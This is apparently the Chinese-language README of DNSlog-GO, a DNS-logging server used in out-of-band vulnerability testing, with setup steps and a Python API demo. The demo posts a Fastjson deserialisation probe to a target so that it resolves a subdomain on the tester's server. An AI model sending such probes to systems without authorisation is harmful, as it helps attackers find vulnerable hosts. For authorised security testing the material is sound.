## DNSlog-GO <https://github.com/lanyi1998/DNSlog-GO>
<!--auto_detail_badge_begin_0b490ffb61b26b45de3ea5d7dd8a582e-->
![Language](https://img.shields.io/badge/Language-Golang-blue)
![Author](https://img.shields.io/badge/Author-lanyi-orange)
![GitHub stars](https://img.shields.io/github/stars/lanyi1998/DNSlog-GO.svg?style=flat&logo=github)
![Version](https://img.shields.io/badge/Version-V1.5.2-red)
![Time](https://img.shields.io/badge/Join-20220316-green)
<!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->


DNSLog-GO 是一款golang编写的监控 DNS 解析记录的工具，自带多用户WEB界面

演示截图:

![avatar](https://github.com/lanyi1998/DNSlog-GO/raw/master/images/demo.png)

安装
---

详细图文教程:https://mp.weixin.qq.com/s/m_UXJa0imfOi721bkBpwFg

# 1.获取发行版

这里 https://github.com/lanyi1998/DNSlog-GO/releases 下载最新发行版,并解压

# 2.域名与公网 IP 准备

```
搭建并使用 DNSLog，你需要拥有一个域名如(a.com),还需要有一个公网 IP 地址(如：1.1.1.1)
    
修改 a.com 的 NS 记录为 

NS1.vpsip.NIP.IO
NS2.vpsip.NIP.IO

如 
ns1.1.1.1.1.nip.io
ns1.1.1.1.1.nip.io

本步骤中，需要在域名提供商提供的页面进行设置，部分域名提供商只允许修改 NS 记录为已经认证过的 NS 地址。所以需要找一个支持修改 NS 记录为自己 NS 的域名提供商。
    
注意: NS 记录修改之后部分地区需要 24-48 小时会生效
```

# 3.修改配置文件 config.ini

```
HTTP:
  port: 8000 //http web监听端口
  #{"token":"用户对应子域名"}
  user: { "admin": "admin" } //用户admin 对应的dnslog子域名是 admin.demo.com
  consoleDisable: false  //是否关闭web页面
Dns:
  domain: demo.com //dnslog域名
```

# 4.启动对应系统的客户端

**注意服务端重启以后，如果修改了用户对应子域名，必须清空一下浏览器中的localStorage,否则会获取不到数据**

---

API Python Demo

```python
import requests
import random
import json


class DnsLog():
    domain = ""
    token = ""
    Webserver = ""

    def __init__(self, Webserver, token):
        self.Webserver = Webserver  # dnslog的http监听地址，格式为 ip:端口
        self.token = token  # token
        # 检测DNSLog服务器是否正常
        try:
            res = requests.post("http://" + Webserver + "/api/verifyToken", json={"token": token}).json()
            self.domain = res.Msg
        except:
            exit("DnsLog 服务器连接失败")
        if res["Msg"] == "false":
            exit("DnsLog token 验证失败")

    # 生成随机子域名
    def randomSubDomain(self, length=5):
        subDomain = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba', length)) + '.' + self.domain
        return subDomain

    # 验证子域名是否存在
    def checkDomain(self, domain):
        res = requests.post("http://" + self.Webserver + "/api/verifyDns", json={"Query": domain},
                            headers={"token": self.token}).json()
        if res["Msg"] == "false":
            return False
        else:
            return True


url = "http://192.168.41.2:8090/"

dns = DnsLog("1111:8888", "admin")

subDomain = dns.randomSubDomain()

payload = {
    "b": {
        "@type": "java.net.Inet4Address",
        "val": subDomain
    }
}

requests.post(url, json=payload)

if dns.checkDomain(subDomain):
    print("存在FastJosn")
```


<!--auto_detail_active_begin_e1c6fb434b6f0baf6912c7a1934f772b-->
## 项目相关


## 最近更新

#### [v1.5.2] - 2022-06-08

**更新**  
- 通过配置文件，可固定每个用户对应的子域名。避免每次重启后，用户对应的子域名发生变动

<!--auto_detail_active_end_f9cf7911015e9913b7e691a7a5878527-->
